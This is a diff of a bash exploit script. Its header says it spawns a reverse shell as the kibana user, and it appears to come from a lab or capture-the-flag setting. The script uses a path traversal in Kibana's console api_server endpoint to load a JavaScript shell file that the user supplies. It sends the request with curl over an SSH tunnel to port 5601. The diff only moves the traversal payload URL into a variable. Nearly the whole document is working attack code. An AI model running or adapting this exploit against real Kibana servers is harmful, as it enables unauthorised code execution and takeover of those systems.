@@ -2,11 +2,14 @@
 # Script to automate spawning a reverse shell as the kibana user  #
 ###################################################################
 
+PAYLOAD="http://127.0.0.1:5601/api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../../../../.."
+
 # Shell needs to be placed on the server with the security user
 echo "[!] Please enter the path of the javascript shell: "
 read SHELL_PATH
 echo "[*] SHELL_PATH: $SHELL_PATH"
 echo ""
+
 
 if [[ $(lsof -i:5601) ]]; then
     echo "[!] SSH tunnel already active!"
@@ -18,5 +21,5 @@ else
 fi
 
 echo "[!] Spawning reverse shell!"
-echo "[*] Requesting: http://127.0.0.1:5601/api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../../../../..$SHELL_PATH"
-curl 'http://127.0.0.1:5601/api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../../../../..$SHELL_PATH'
+echo "[*] Requesting: $PAYLOAD$SHELL_PATH"
+curl $PAYLOAD$SHELL_PATH
